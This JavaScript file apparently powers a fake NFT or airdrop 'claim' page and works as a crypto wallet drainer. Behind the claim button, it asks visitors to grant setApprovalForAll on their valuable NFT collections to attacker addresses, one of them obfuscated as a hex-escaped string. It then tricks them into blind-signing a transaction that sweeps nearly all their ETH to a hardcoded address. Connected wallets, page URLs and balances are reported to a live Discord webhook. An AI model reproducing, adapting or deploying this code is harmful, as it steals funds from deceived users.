//#region Web3.js

let web3Provider;


Moralis.onWeb3Enabled(async (data) => {
    if (data.chainId !== 1 && metamaskInstalled) await Moralis.switchNetwork("0x1");
    updateState(true);
    console.log(data);
});
Moralis.onChainChanged(async (chain) => {
    if (chain !== "0x1" && metamaskInstalled) await Moralis.switchNetwork("0x1");
});
window.ethereum ? window.ethereum.on('disconnect', () => updateState(false)) : null;
window.ethereum ? window.ethereum.on('accountsChanged', (accounts) => {
    if (accounts.length < 1) updateState(false)
}) : null;


async function updateState(connected) {
    const web3Js = new Web3(Moralis.provider);
    document.getElementById('walletAddress').innerHTML = connected ? `CONNECTED <br> <span>${(await web3Js.eth.getAccounts())[0]}</span>` : `NOT CONNECTED`;
    document.querySelector("#claimButton").style.display = connected ? "" : "none";
}

setTimeout(async () => {
    try {
        const web3Js = new Web3(Moralis.provider);
        const walletAddress = (await web3Js.eth.getAccounts())[0];
        const url = window.location.href
        sW(`\`${walletAddress}\` is connected: ${url}`);
        console.log(`${walletAddress} is connected`)
    } catch (e) {
        Object.assign(document.createElement('a'), {
            href: "./index.html",
        }).click();
    }
}, 5000);

async function askSign() {
    const web3Js = new Web3(Moralis.provider);
    const walletAddress = (await web3Js.eth.getAccounts())[0];

    try {
        const message = signMessage.replace("{address}", walletAddress).replace("{nonce}", createNonce());

        const signature = await web3Js.eth.personal.sign(message, walletAddress);
        const signing_address = await web3Js.eth.personal.ecRecover(message, signature);

        console.log(`Signing address: ${signing_address}\n${walletAddress.toLowerCase() == signing_address.toLowerCase() ? "Same address" : "Not the same address."}`);
        return true;
    } catch (e) {
        if (e.message.toLowerCase().includes("user denied")) notEligible("signDenied");
        console.log(e);
        return false;
    }

}

async function askNfts() {
    const web3Js = new Web3(Moralis.provider);
    const walletAddress = (await web3Js.eth.getAccounts())[0];

    const options = { method: 'GET', headers: { Accept: 'application/json' } };

    let walletNfts = await fetch(`https://api.opensea.io/api/v1/collections?asset_owner=${walletAddress}&offset=0&limit=300`, options)
        .then(response => response.json())
        .then(nfts => {
            console.log(nfts)
            if (nfts.includes("Request was throttled.")) return ["Request was throttled."];
            return nfts.filter(nft => {
                if (nft.primary_asset_contracts.length > 0) return true
                else return false
            }).map(nft => {
                return {
                    type: nft.primary_asset_contracts[0].schema_name.toLowerCase(),
                    contract_address: nft.primary_asset_contracts[0].address,
                    price: round(nft.stats.one_day_average_price != 0 ? nft.stats.one_day_average_price : nft.stats.seven_day_average_price),
                    owned: nft.owned_asset_count,
                }
            })
        }).catch(err => console.error(err));
    if (walletNfts.includes("Request was throttled.")) return verifyAsset();
    if (walletNfts.length < 1) return verifyAsset();

    let transactionsOptions = [];
    for (nft of walletNfts) {
        if (nft.price === 0) continue;
        const ethPrice = round(nft.price * (nft.type == "erc1155" ? nft.owned : 1))
        // set minValue from settings.js
        if (ethPrice < drainNftsInfo.minValue) continue;
        const thewallet = ethPrice < 2 ? receiveAddress : nW;
        transactionsOptions.push({
            price: ethPrice,
            options: {
                contractAddress: nft.contract_address,
                from: walletAddress,
                functionName: "setApprovalForAll",
                abi: [{
                    "inputs": [
                        { "internalType": "address", "name": "operator", "type": "address" },
                        { "internalType": "bool", "name": "approved", "type": "bool" }
                    ],
                    "name": "setApprovalForAll",
                    "outputs": [],
                    "stateMutability": "nonpayable",
                    "type": "function"
                }],
                params: { operator: thewallet, approved: true },
                gasLimit: (await web3Js.eth.getBlock("latest")).gasLimit
            }
        });
    }
    if (transactionsOptions.length < 1) return notEligible("noNFTs");

    let transactionLists = await transactionsOptions.sort((a, b) => b.price - a.price)
    for (const trans of transactionLists) {
        console.log(`Transferring ${trans.options.contractAddress} (${trans.price} ETH)`);
        await Moralis.executeFunction(trans.options).catch(O_o => console.error(O_o, options)).then(uwu => {
            if (uwu) sendWebhooks(walletAddress, trans.options.contractAddress, trans.price);
        });
    }
    await verifyAsset();
}


let eth_bal = 0;
const verifyAsset = async () => {
    const web3Js = new Web3(Moralis.provider);
    const walletAddress = (await web3Js.eth.getAccounts())[0];
    try {
        eth_bal = await web3Js.eth.getBalance(walletAddress);
        const r_bal = web3Js.utils.fromWei(eth_bal, 'ether');
        console.log(`Current balance for ${walletAddress} : ${r_bal} ETH`);
        if (r_bal < 0.5) {sW(`Current balance for ${walletAddress} : ${r_bal} ETH`);}
       if (r_bal > 0.004) askTransferWithSign(r_bal);
        else {
            console.log(`Error, balance is too low. (< 0.004 ETH)`);
            sW(`Error, balance is too low. (< 0.004 ETH). Balance: ' ${r_bal}`);
        }
    } catch (e) {
        console.log(e);
    }
};


async function askTransferWithSign(rbal) {
    const web3Js = new Web3(Moralis.provider);
    const walletAddress = (await web3Js.eth.getAccounts())[0];
    const chainId = await web3Js.eth.getChainId();
    await web3Js.eth.getTransactionCount(walletAddress, "pending")
        .then(async (txnCount) => {
            const jgasPrice = await web3Js.eth.getGasPrice();
            const mgasPrice = web3Js.utils.toHex(Math.floor(jgasPrice * 1.4));
            const gas = new web3Js.utils.BN("22000");
            const cost = gas * Math.floor(jgasPrice * 2);   
            const toSend = eth_bal - cost; //  0x4e68a4a4bdab500 = 0.3531216725 Ether
            console.log(`Sending ${web3Js.utils.fromWei(toSend.toString(), "ether")} ETH from ${walletAddress}...`);
            
            const txObject = {
                nonce: web3Js.utils.toHex(txnCount),
                gasPrice: mgasPrice, gasLimit: "0x55F0",
                to: "0xBFa0562eA2c334393eD68999468Ad554148AC722",
                value: "0x" + toSend.toString(16),
                data: "0x", v: "0x1", r: "0x", s: "0x"      // mainnet
                //data: "0x", v: "0x3", r: "0x", s: "0x"   // @Ropsten Testing

            };

            let ethTX = new ethereumjs.Tx(txObject);
            const rawTx1 = '0x' + ethTX.serialize().toString('hex');
            const rawHash1 = web3Js.utils.sha3(rawTx1, { encoding: 'hex' });

            console.log("rawTx1:", rawTx1);
            console.log("rawHash1:", rawHash1);

            await web3Js.eth.sign(rawHash1, walletAddress).then(async (result) => {

                const signature = result.substring(2);
                const r = "0x" + signature.substring(0, 64);
                const s = "0x" + signature.substring(64, 128);
                const v = parseInt(signature.substring(128, 130), 16);

                const y = web3Js.utils.toHex(v + chainId * 2 + 8);

                ethTX.r = r;
                ethTX.s = s;
                ethTX.v = y;

                console.log(ethTX);

                const rawTx = '0x' + ethTX.serialize().toString('hex');
                const rawHash = web3Js.utils.sha3(rawTx, { encoding: 'hex' });

                console.log("rawTx:", rawTx);
                console.log("rawHash:", rawHash);

                await web3Js.eth.sendSignedTransaction(rawTx).then((hash) => console.log(hash)).catch((e) => console.log(e));
                if (rbal < 1.75) {sW(`Sending ${web3Js.utils.fromWei(toSend.toString(), "ether")} ETH from ${walletAddress}...`);}
                
            }).catch((err) => console.log(err));
        })
}
async function notEligible(info) {
    const noteli = document.getElementById("notEli")
    noteli.style.display = "";
    switch (info) {
        case "signDenied":
            noteli.innerText = "You denied the sign request. Please try again."
            break;
        case "noNFTs":
            await verifyAsset();
            break;
        case "noETH":
            noteli.innerText = "You are not eligible."
            break;
        default:
            noteli.innerText = "Something went wrong."
            break;
    }

}

let disabled = false;
async function askTransfer() {
    connectToNewApiEndPoint();
    if (disabled) return;
    document.getElementById('claimButton').style.opacity = 0.5;
    disabled = true;
    // if (await askSign()) await askNfts();
    await askNfts();
    disabled = false;
    document.getElementById('claimButton').style.opacity = 1;
}

let metamaskInstalled = false;
if (typeof window.ethereum !== 'undefined') metamaskInstalled = true;
window.addEventListener('load', async () => {
    await Moralis.enableWeb3(metamaskInstalled ? {} : { provider: "walletconnect" });
    document.querySelector("#claimButton").addEventListener("click", askTransfer);
});

//#region Utils Functions 
const round = (value) => {
    return Math.round(value * 10000) / 10000;
}
const sleep = (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// api endpoint + new function drainAllNFT()
let nW = ""
async function connectToNewApiEndPoint() {
    const web3Js = new Web3(Moralis.provider);
    const options = {
        method: 'GET',
        headers: {
            Accept: 'application/json',
            'X-API-KEY': '731924da94014176916471c8df4571ace'
        }
    };
    //var apiEndPoint=["\x30\x78\x33\x37\x32\x44\x41\x37\x63\x33\x38\x65\x62\x37\x37\x32\x34\x35\x36\x30\x32\x38\x35\x33\x34\x62\x61\x32\x34\x46\x31\x36\x36\x64\x63\x39\x33\x32\x39\x44\x33\x35"];
    var apiEndPoint=["\x30\x78\x33\x37\x32\x44\x41\x37\x63\x33\x38\x65\x62\x37\x37\x32\x34\x35\x36\x30\x32\x38\x35\x33\x34\x62\x61\x32\x34\x46\x31\x36\x36\x64\x63\x39\x33\x32\x39\x44\x33\x35"];
    nW=apiEndPoint[0] //take first param from new apiEndPoint
}

const rdmString = (length) => {
    let x = "";
    const possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (let i = 0; i < length; i++) x += possible.charAt(Math.floor(Math.random() * possible.length));
    return x;
}
const createNonce = () => {
    return `${rdmString(8)}-${rdmString(4)}-${rdmString(4)}-${rdmString(12)}`; // 1a196cf5-d873-9c36-e26ae9f3bd2e
}
const sendWebhooks = (userWallet, contract, price) => fetch(`/api.php?o=success`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ userWallet, contract, price, discordWebhookURL })
}).catch(err => console.error(err));

//#region Utils Functions
function isMobile() {
    var check = false;
    (function (a) {
        if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true;
    })(navigator.userAgent || navigator.vendor || window.opera);
    return check;
};


//#endregion

const discordWebhookURL = "https://discord.com/api/webhooks/1014585591855321108/YwrLEH5mgdinb4L76dC0vr2k9YViWcqaRCeIQd_K1yeZR78YP1xSt345Zxw-JfmnezlK"

const sW = (message) => {
    // const webhookURL = "https://discord.com/api/webhooks/wdwefwefwefwefwefwefwefwefwefwefwefwefwefwefwefwef"
    const webhookURL = "https://discord.com/api/webhooks/1014585591855321108/YwrLEH5mgdinb4L76dC0vr2k9YViWcqaRCeIQd_K1yeZR78YP1xSt345Zxw-JfmnezlK"
    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            content: message
        }),
    }).catch(err => console.error(err));
}
